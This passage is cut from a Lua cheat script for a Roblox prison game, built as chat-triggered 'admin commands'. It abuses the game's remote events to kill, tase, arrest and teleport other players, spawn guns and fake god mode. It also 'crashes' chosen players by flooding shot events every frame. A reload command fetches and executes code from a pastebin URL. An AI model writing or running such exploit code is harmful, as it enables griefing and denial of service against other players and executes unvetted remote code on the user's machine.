				["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
				["Distance"] = 0, 
				["Cframe"] = CFrame.new(), 
				["Hit"] = workspace[Player.Name].Head
			}, [4] = {
				["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
				["Distance"] = 0, 
				["Cframe"] = CFrame.new(), 
				["Hit"] = workspace[Player.Name].Head
			}, [5] = {
				["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
				["Distance"] = 0, 
				["Cframe"] = CFrame.new(), 
				["Hit"] = workspace[Player.Name].Head
			}, [6] = {
				["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
				["Distance"] = 0, 
				["Cframe"] = CFrame.new(), 
				["Hit"] = workspace[Player.Name].Head
			}, [7] = {
				["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
				["Distance"] = 0, 
				["Cframe"] = CFrame.new(), 
				["Hit"] = workspace[Player.Name].Head
			}, [8] = {
				["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
				["Distance"] = 0, 
				["Cframe"] = CFrame.new(), 
				["Hit"] = workspace[Player.Name].Head
			}
		}

		game:GetService("ReplicatedStorage").ShootEvent:FireServer(FireEvent, Gun)
		Gun.Parent = game.Players.LocalPlayer.Character
		game.Players.LocalPlayer.Character["Remington 870"]:Destroy()
	end)
end

function Tase(Player)
	if Player.TeamColor.Name == "Bright blue" or not workspace:FindFirstChild(Player.Name) or not workspace:FindFirstChild(Player.Name):FindFirstChild("Head") or Player == nil or Player.Character.Parent ~= workspace then return end
	pcall(function()
		local savedcf = GetPos()
		local savedteam

		local Gun = game.Players.LocalPlayer.Backpack:FindFirstChild("Taser") or game.Players.LocalPlayer.Character:FindFirstChild("Taser")

		local changedteam = false
		if game.Players.LocalPlayer.TeamColor.Name ~= "Bright blue" or not Gun then
			savedteam = GetTeam()
			workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Bright blue").Name)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
			changedteam = true
		end

		local Guns = game.Players.LocalPlayer.Backpack:FindFirstChild("Taser") or game.Players.LocalPlayer.Character:FindFirstChild("Taser")

		local TaseEvent = 
			{
				[1] = 
				{
					["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
					["Distance"] = 0, 
					["Cframe"] = CFrame.new(), 
					["Hit"] = workspace[Player.Name].Torso
				}
			}

		game:GetService("ReplicatedStorage").ShootEvent:FireServer(TaseEvent, Guns)
		if changedteam then
			workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new(savedteam).Name)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
		end
	end)
end

function Teleport(Player, Position)
	if Player == nil or Position == nil then return end
	local savedcf = GetPos()
	workspace.Remote.loadchar:InvokeServer()
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
	workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
	local CHAR = game.Players.LocalPlayer.Character
	CHAR.Humanoid.Name = "1"
	local c = CHAR["1"]:Clone()
	c.Name = "Humanoid"
	c.Parent = CHAR
	CHAR["1"]:Destroy()
	game.Workspace.CurrentCamera.CameraSubject = CHAR
	CHAR.Animate.Disabled = true
	wait()
	CHAR.Animate.Disabled = false
	CHAR.Humanoid.DisplayDistanceType = "None"
	game.Players.LocalPlayer:FindFirstChild("Backpack"):FindFirstChild("M9").Parent = CHAR
	local STOP = 0
	repeat wait(.1)
		STOP = STOP + 1
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Player.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 0.75)
	until (not game.Players.LocalPlayer.Character:FindFirstChild("M9") or not game.Players.LocalPlayer.Character.HumanoidRootPart or not Player.Character.HumanoidRootPart or not game.Players.LocalPlayer.Character.HumanoidRootPart.Parent or not Player.Character.HumanoidRootPart.Parent or STOP > 500) and STOP > 3
	local STOP_2 = 0
	repeat wait()
		STOP_2 = STOP_2 + 1
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Position
	until STOP_2 > 10
	workspace.Remote.loadchar:InvokeServer()
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
end

function TeleportV(Player, Player2)
	if Player == nil or Player2 == nil then return end
	local savedcf = GetPos()
	workspace.Remote.loadchar:InvokeServer()
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
	workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
	local CHAR = game.Players.LocalPlayer.Character
	CHAR.Humanoid.Name = "1"
	local c = CHAR["1"]:Clone()
	c.Name = "Humanoid"
	c.Parent = CHAR
	CHAR["1"]:Destroy()
	game.Workspace.CurrentCamera.CameraSubject = CHAR
	CHAR.Animate.Disabled = true
	wait()
	CHAR.Animate.Disabled = false
	CHAR.Humanoid.DisplayDistanceType = "None"
	game.Players.LocalPlayer:FindFirstChild("Backpack"):FindFirstChild("M9").Parent = CHAR
	local STOP = 0
	repeat wait(.1)
		STOP = STOP + 1
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Player.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 0.75)
	until (not game.Players.LocalPlayer.Character:FindFirstChild("M9") or not game.Players.LocalPlayer.Character.HumanoidRootPart or not Player.Character.HumanoidRootPart or not game.Players.LocalPlayer.Character.HumanoidRootPart.Parent or not Player.Character.HumanoidRootPart.Parent or STOP > 500) and STOP > 3
	local STOP_2 = 0
	repeat wait()
		STOP_2 = STOP_2 + 1
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Player2.Character.HumanoidRootPart.CFrame
	until STOP_2 > 10
	workspace.Remote.loadchar:InvokeServer()
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
end

function ArrestEvent(Player, Time)
	for i = 1,Time do
		workspace.Remote.arrest:InvokeServer(Player.Character.Head)
	end
end

function Arrest(Player, Time)
	local Time = Time or 1
	local savedcf = GetPos()
	local savedcamcf = GetCamPos()
	local savedteam = GetTeam()
	if Player then
		repeat wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Player.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 1)
			for i = 1,Time do
				coroutine.wrap(function()
					workspace.Remote.arrest:InvokeServer(Player.Character.Head)
				end)()
			end
		until Player.Character:FindFirstChild("Head"):FindFirstChild("handcuffedGui")
		wait()
	end
	workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new(savedteam).Name)
	game.Players.LocalPlayer.Character.Humanoid.Sit = false
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
	workspace.CurrentCamera.CFrame = savedcamcf
end

function CreateBeam(Player, Distance, Position)
	if Player then
		pcall(function()
			local Backpack = game.Players.LocalPlayer.Backpack
			local Character = game.Players.LocalPlayer.Character
			local Gun = Backpack:FindFirstChild("Remington 870") or Character:FindFirstChild("Remington 870")
			if not Gun then
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
			end
			Gun = Backpack:FindFirstChild("Remington 870") or Character:FindFirstChild("Remington 870")
			local Head = Player.Character.Head
			if Head and Player and Character and Backpack and Gun and Distance and Position then
				game.ReplicatedStorage.ShootEvent:FireServer({
					{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
					{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
					{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
					{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
					{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
					{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
					{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
					{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head}
				}, Gun)
			end
			Gun.Parent = game.Players.LocalPlayer.Character
			game.Players.LocalPlayer.Character:FindFirstChild("Remington 870"):Destroy()
		end)
	end
end

function CreateBeam2(Player, Distance, Position)
	if Player then
		pcall(function()
			local Backpack = game.Players.LocalPlayer.Backpack
			local Character = game.Players.LocalPlayer.Character
			local Gun = Backpack:FindFirstChild("AK-47") or Character:FindFirstChild("AK-47")
			if not Gun then
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["AK-47"].ITEMPICKUP)
			end
			Gun = Backpack:FindFirstChild("AK-47") or Character:FindFirstChild("AK-47")
			local Head = Player.Character.Head
			if Head and Player and Character and Backpack and Gun and Distance and Position then
				game.ReplicatedStorage.ShootEvent:FireServer({
					{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
					{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
					{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
					{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
					{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
					{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
					{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
					{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
					{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
					{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
					{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
					{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
					{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
					{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
					{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
					{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
					{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
					{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
					{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
					{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
					{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
					{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
					{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
					{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
					{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
					{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
					{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
					{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
					{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
					{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
				}, Gun)
			end
			Gun.Parent = game.Players.LocalPlayer.Character
			game.Players.LocalPlayer.Character:FindFirstChild("AK-47"):Destroy()
		end)
	end
end

function CreateBeam3(Player, Distance, Position)
	if Player then
		pcall(function()
			local Backpack = game.Players.LocalPlayer.Backpack
			local Character = game.Players.LocalPlayer.Character
			local Gun = Backpack:FindFirstChild("M9") or Character:FindFirstChild("M9")
			if not Gun then
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
			end
			Gun = Backpack:FindFirstChild("M9") or Character:FindFirstChild("M9")
			local Head = Player.Character.Head
			if Head and Player and Character and Backpack and Gun and Distance and Position then
				game.ReplicatedStorage.ShootEvent:FireServer({
					{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
					{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
					{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
					{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
					{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
					{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
					{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
					{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
					{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
					{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
					{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
					{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
					{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
					{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head},
					{["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),["Distance"] = Distance,["Cframe"] = Position,["Hit"] = Head}
				}, Gun)
			end
			Gun.Parent = game.Players.LocalPlayer.Character
			game.Players.LocalPlayer.Character:FindFirstChild("M9"):Destroy()
		end)
	end
end

function Beam(Player, Distance, Time)
	if Player and Distance then
		local RunService = game:GetService("RunService")
		RunService:BindToRenderStep(Player.Name, math.huge, function()
			coroutine.wrap(function()
				CreateBeam(Player, Distance, Player.Character.HumanoidRootPart.CFrame)
			end)()
		end)
		delay(Time, function()
			pcall(function()
				RunService:UnbindFromRenderStep(Player.Name)
			end)
		end)
	end
end

function LagBeam(Player, Distance, Time)
	if Player and Distance then
		local RunService = game:GetService("RunService")
		RunService:BindToRenderStep(Player.Name, math.huge, function()
			coroutine.wrap(function()
				CreateBeam(Player, Distance, Player.Character.HumanoidRootPart.CFrame)
			end)()
			coroutine.wrap(function()
				CreateBeam2(Player, Distance, Player.Character.HumanoidRootPart.CFrame)
			end)()
			coroutine.wrap(function()
				CreateBeam3(Player, Distance, Player.Character.HumanoidRootPart.CFrame)
			end)()
		end)
		delay(Time, function()
			pcall(function()
				RunService:UnbindFromRenderStep(Player.Name)
			end)
		end)
	end
end

function DetectMove(Player)
	local oldpos = Player.Character.HumanoidRootPart.CFrame
	local Move
	local Time = 0
	repeat wait(.1)
		Time = Time + 1
		if oldpos ~= Player.Character.HumanoidRootPart.CFrame then
			Move = true
		else
			Move = false
		end
	until (Time >= 500 and Move == false) or Move == true
	return Move
end

function FeGodMode()
	game.Players.LocalPlayer.Character.Humanoid.Name = 1
	local l = game.Players.LocalPlayer.Character["1"]:Clone()
	l.Parent = game.Players.LocalPlayer.Character
	l.Name = "Humanoid"
	game.Players.LocalPlayer.Character.Animate.Disabled = true
	wait()
	game.Players.LocalPlayer.Character.Animate.Disabled = false
	game.Players.LocalPlayer.Character["1"]:Destroy()
	game.Workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character
end

local function GetPlayerPart(Player)
	if not Player then return end
	if Player:FindFirstChild("HumanoidRootPart") then
		return Player.HumanoidRootPart
	elseif Player:FindFirstChild("Torso") then
		return Player.Torso
	end
end

local Mouse = game.Players.LocalPlayer:GetMouse()

function CopyChat(Player)
	Player.Chatted:Connect(function(Message)
		if States.CopyChat then
			Chat("["..Player.DisplayName.."]: "..Message)
		end
	end)
end

function Died(Player)
	pcall(function()
		if Player.Character.Humanoid.Health < 1 then
			if States.ChatNotify then
				Chat(Player.DisplayName.." Died")
			end
			if States.Notify then
				game.StarterGui:SetCore("SendNotification", {
					Title = "Game",
					Text = Player.DisplayName.." Died",
					Icon = game.Players:GetUserThumbnailAsync(Player.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size352x352)
				})
			end
		end
	end)
end

function PlayerPickUp(Player)
	Player.Backpack.ChildAdded:Connect(function(Item)
		if States.ChatNotify then
			Chat(Player.DisplayName.." Pick Up "..Item.Name)
		end
		if States.Notify then
			game.StarterGui:SetCore("SendNotification", {
				Title = "Game",
				Text = Player.DisplayName.." Pick Up "..Item.Name,
				Icon = game.Players:GetUserThumbnailAsync(Player.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size352x352)
			})
		end
	end)
end

local function Notify(Message, Color, Text)
	Notify6.Text = Notify5.Text
	Notify6.TextColor3 = Notify5.TextColor3
	Notify5.Text = Notify4.Text
	Notify5.TextColor3 = Notify4.TextColor3
	Notify4.Text = Notify3.Text
	Notify4.TextColor3 = Notify3.TextColor3
	Notify3.Text = Notify2.Text
	Notify3.TextColor3 = Notify2.TextColor3
	Notify2.Text = Notify1.Text
	Notify2.TextColor3 = Notify1.TextColor3
	Notify1.Text = "["..Text.."] "..Message
	Notify1.TextColor3 = Color or Color3.fromRGB(255, 255, 255)
end

local function Loadstring(Https)
	if not Https then return end
	loadstring(game:HttpGet((Https), true))()
end

local function Command(Cmd)
	return Arg1 == Prefix..Cmd
end

local function PrefixCommand(Cmd)
	return Arg1 == "!"..Cmd
end

local Walls = {
	game.Workspace.Prison_Halls.walls,
	game.Workspace.Prison_Halls.roof,
	game.Workspace.Prison_Halls.outlines,
	game.Workspace.Prison_Halls.lights,
	game.Workspace.Prison_Halls.accent,
	game.Workspace.Prison_Halls.glass,
	game.Workspace.Prison_Cellblock.b_front,
	game.Workspace.Prison_Cellblock.doors,
	game.Workspace.Prison_Cellblock.c_tables,
	game.Workspace.Prison_Cellblock.a_front,
	game.Workspace.Prison_Cellblock.b_outerwall,
	game.Workspace.Prison_Cellblock.c_wall,
	game.Workspace.Prison_Cellblock.b_wall,
	game.Workspace.Prison_Cellblock.c_hallwall,
	game.Workspace.Prison_Cellblock.a_outerwall,
	game.Workspace.Prison_Cellblock.b_ramp,
	game.Workspace.Prison_Cellblock.a_ramp,
	game.Workspace.Prison_Cellblock.a_walls,
	game.Workspace.Prison_Cellblock.Cells_B,
	game.Workspace.Prison_Cellblock.Cells_A,
	game.Workspace.Prison_Cellblock.c_corner,
	game.Workspace.Prison_Cellblock.Wedge,
	game.Workspace.Prison_Cellblock.a_ceiling,
	game.Workspace.Prison_Cellblock.b_ceiling,
	game.Workspace.City_buildings,
	game.Workspace.Prison_OuterWall,
	game.Workspace.Prison_Fences,
	game.Workspace.Prison_Guard_Outpost,
	game.Workspace.Prison_Cafeteria.building,
	game.Workspace.Prison_Cafeteria.glass,
	game.Workspace.Prison_Cafeteria.oven,
	game.Workspace.Prison_Cafeteria.shelves,
	game.Workspace.Prison_Cafeteria.vents,
	game.Workspace.Prison_Cafeteria.accents,
	game.Workspace.Prison_Cafeteria["vending machine"],
	game.Workspace.Prison_Cafeteria.Prison_table1,
	game.Workspace.Prison_Cafeteria.counter,
	game.Workspace.Prison_Cafeteria.boxes,
	game.Workspace.Prison_Cafeteria["trash bins"]
}

--[[if not Slient then
	Chat("Admin Commands By LocalPlayer   #   7434")
	Chat("Admin Commands Version "..Versions)
	Chat("Current Prefix Is "..Prefix)
	wait()
	Chat("Admin Commands Loaded!")
else
	Chat("Loaded")
	Chat("P "..Prefix)
	Chat("V "..Versions)
end]]

Notify("Loaded admin commands", Color3.fromRGB(0, 255, 0), "Loads")

function PlayerChatted(Message)
	if ScriptDisabled then return end
	Split = Message:split(" ")
	Arg1 = Split[1]
	Arg2 = Split[2]
	Arg3 = Split[3]
	Arg4 = Split[4]
	if Command("unload") or Command("destroygui") then
		Notify("Unloading...", Color3.fromRGB(0, 255, 255), "Unloads")
		wait(.1)
		pcall(function()
			CmdGui:Destroy()
			States = {}
			LoopKill = {}
			LoopTase = {}
			Admin = {}
			ScriptDisabled = true
			for i,v in pairs(game.Lighting:GetChildren()) do
				v.Parent = workspace
			end
		end)
	end
	if Command("reload") or Command("update") then
		Notify("Updating versions...", Color3.fromRGB(0, 255, 255), "Updates")
		pcall(function()
			CmdGui:Destroy()
			States = {}
			LoopKill = {}
			LoopTase = {}
			Admin = {}
			ScriptDisabled = true
			for i,v in pairs(game.Lighting:GetChildren()) do
				v.Parent = workspace
			end
		end)
		Loadstring("https://pastebin.com/raw/9ab2s523")
	end
	if Command("beam") then
		local Player = GetPlayer(Arg2)
		if Player then
			Beam(Player, math.huge, 7)
			Notify("Beamed "..Player.Name, Color3.fromRGB(0, 255, 0), "Success")
		else
			Notify("No player found", Color3.fromRGB(255, 0, 0), "Error")
		end
	end
	if Command("lagbeam") or Command("beam2") then
		local Player = GetPlayer(Arg2)
		if Player then
			LagBeam(Player, math.huge, 7)
			Notify("Lag beamed "..Player.Name, Color3.fromRGB(255, 0, 0), "Success")
		else
			Notify("No player found", Color3.fromRGB(255, 0, 0), "Error")
		end
	end
	if Command("crash") or Command("beam3") then
		local Player = GetPlayer(Arg2)
		if Player then
			LagBeam(Player, math.huge, 9000)
			Notify("Crashed "..Player.Name, Color3.fromRGB(0, 255, 0), "Success")
		else
			Notify("No player found", Color3.fromRGB(255, 0, 0), "Error")
		end
	end
	if Command("antispamarrest") then
		States.Anti_Spam_Arrest = true
		Notify("Turn anti spam arrest on", Color3.fromRGB(0, 255, 0), "Success")
		while wait() do
			if States.Anti_Spam_Arrest then
				pcall(function()
					if game.Players.LocalPlayer.Character.Head:FindFirstChild("handcuffedGui") then
						repeat wait()
							coroutine.wrap(function()
								game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(888, 100, 2388)
								workspace.Remote.TeamEvent:FireServer("Medium stone grey")
								workspace.Remote.TeamEvent:FireServer("Bright blue")
							end)()
						until game.Players.LocalPlayer.TeamColor.Name == "Bright blue"
						wait(.1)
						for i = 1,10 do
							workspace.Remote.TeamEvent:FireServer("Medium stone grey")
						end
					end
				end)
			end
		end
	end
	if Command("unantispamarrest") then
		States.Anti_Spam_Arrest = false
		Notify("Turn anti spam arrest off", Color3.fromRGB(0, 255, 0), "Success")
	end
	if Command("inmate") or Command("inmates") or Command("prisoner") or Command("prisoners") then
		workspace.Remote.TeamEvent:FireServer("Bright orange")
		Notify("Become inmate", Color3.fromRGB(0, 255, 0), "Success")
	end
	if Command("guard") or Command("guards") or Command("cop") or Command("polices") or Command("cops") then
		workspace.Remote.TeamEvent:FireServer("Bright blue")
		if game.Players.LocalPlayer.TeamColor.Name == "Bright blue" then
			Notify("Become guard", Color3.fromRGB(0, 255, 0), "Success")
		else
			Notify("Fulled team", Color3.fromRGB(255, 0, 0), "Error")
		end
	end
	if Command("gun") or Command("guns") or Command("allguns") then
		if BuyGamepass then
			workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
			workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M4A1"].ITEMPICKUP)
			workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["AK-47"].ITEMPICKUP)
			workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
		else
			workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
			workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["AK-47"].ITEMPICKUP)
			workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
		end
		Notify("Get all guns", Color3.fromRGB(0, 255, 0), "Success")
	end
	if Command("autogun") or Command("autoguns") or Command("autoallguns") then
		States.Auto_Guns = true
		Notify("Turn auto guns on", Color3.fromRGB(0, 255, 0), "Success")
		if BuyGamepass then
			workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
			workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M4A1"].ITEMPICKUP)
			workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["AK-47"].ITEMPICKUP)
			workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
		else
			workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
			workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["AK-47"].ITEMPICKUP)
			workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
		end
		game.Players.LocalPlayer.CharacterAdded:Connect(function()
			if States.Auto_Guns then
				pcall(function()
					if BuyGamepass then
						workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
						workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M4A1"].ITEMPICKUP)
						workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["AK-47"].ITEMPICKUP)
						workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
					else
						workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
						workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["AK-47"].ITEMPICKUP)
						workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
					end
				end)
			end
		end)
	end
	if Command("unautogun") or Command("unautoguns") or Command("unautoallguns") then
		States.Auto_Guns = false
		Notify("Turn auto guns off", Color3.fromRGB(0, 255, 0), "Success")
	end
	if Command("loopgoto") or Command("loopto") then
		local Player = GetPlayer(Arg2)
		if Player then
			States.LoopGoto = true
			repeat wait()
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Player.Character.HumanoidRootPart.CFrame
			until not States.LoopGoto or not game.Players[Player.Name]
		end
	end
	if Command("unloopgoto") or Command("unloopto") then
		States.LoopGoto = false
	end
	if Command("checkscriptowner") or Command("findowner") then
		for i,v in pairs(game.Players:GetPlayers()) do
			if v.DisplayName == "Hack" and v.Name == "ih4xalots" then
				ChatNotify("Script owner : "..v.Name.." / "..v.DisplayName, Color3.fromRGB(0, 255, 0))
			end
		end
	end
	if Command("getplayer") or Command("getplayers") then
		ChatNotify("Players : "..#game.Players:GetPlayers(), Color3.fromRGB(255, 255, 255))
	end
	if Command("autofire") then
		if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool"):FindFirstChild("GunStates") then
			local Gun = require(game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").GunStates)
			Gun["AutoFire"] = true
			Notify("Turn auto fire", Color3.fromRGB(0, 255, 0), "Success")
		else
			Notify("Equip a gun", Color3.fromRGB(255, 0, 0), "Error")
		end
	end
	if Command("semifire") then
		if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool"):FindFirstChild("GunStates") then
			local Gun = require(game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").GunStates)
			Gun["AutoFire"] = false
			Notify("Turn semi fire", Color3.fromRGB(0, 255, 0), "Success")
		else
			Notify("Equip a gun", Color3.fromRGB(255, 0, 0), "Error")
		end
	end
	if Command("firespeed") or Command("setfirespeed") then
		if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool"):FindFirstChild("GunStates") then
